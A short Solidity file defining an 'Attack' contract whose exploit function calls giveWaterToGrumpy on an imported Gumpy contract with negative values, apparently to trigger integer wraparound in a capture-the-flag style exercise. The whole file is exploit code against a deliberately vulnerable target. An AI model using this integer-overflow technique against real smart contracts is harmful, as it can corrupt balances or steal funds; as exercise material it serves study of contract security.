pragma solidity ^0.6.0;

import "./gumpy.sol";

contract Attack {

    function exploit(address _gumpyAdress) public {
        Gumpy gumpyContract = Gumpy(_gumpyAdress);

        gumpyContract.giveWaterToGrumpy(-128);
        gumpyContract.giveWaterToGrumpy(-28);
    }

}